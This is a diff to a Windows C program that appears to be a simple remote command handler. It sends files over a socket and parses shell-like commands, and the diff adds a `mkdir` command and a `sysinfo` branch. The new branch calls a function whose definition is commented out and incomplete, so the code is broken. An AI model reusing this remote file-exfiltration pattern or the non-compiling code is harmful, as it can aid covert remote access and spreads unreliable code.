@@ -90,7 +90,7 @@ void transmitfiles(char my[]){
     HANDLE openf;
     openf = CreateFileA(Fileopen,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
     int status = TransmitFile(s,openf,GetFileSize(openf,NULL),0,NULL,NULL,TF_USE_DEFAULT_WORKER);
-    // CloseHandle(openf);
+    CloseHandle(openf);
 }
 void fcopy(char my[]){
     char *arr,*arr1;
@@ -106,6 +106,25 @@ void fcopy(char my[]){
         printf("copy success ");
     strcpy(buff,"copied ");
 }
+void mkdir(char my[]){
+    char *arr;
+    arr = strtok(my," ");
+    printf("%s",arr);
+    arr = strtok(NULL," ");
+    printf("%s",arr);
+    LPCSTR path;
+    path = (const char *)arr;
+    if(CreateDirectory(path,NULL)){
+        strcpy(buff,"dir created");
+    }else{
+        strcpy(buff,"can't create dir");
+    }
+}
+// void sysinfo(char my[]){
+//     LPSYSTEM_INFO ptr;
+//     GetSystemInfo(ptr);
+//     strcpy(buff,ptr.)
+// }
 void shell(char my[]){
     char *arr,b1[strlen(my)+1];
     strcpy(b1,my);
@@ -130,7 +149,12 @@ void shell(char my[]){
     }
     else if(strcmp(arr,"cp")== 0){
         fcopy(my);
-        printf("shell copy command ");
+    }
+    else if(strcmp(arr, "mkdir")== 0){
+        mkdir(my);
+    }
+    else if(strcmp(arr,"sysinfo")== 0){
+        sysinfo(arr);
     }
     else
         printf("no cmd found ...\n");
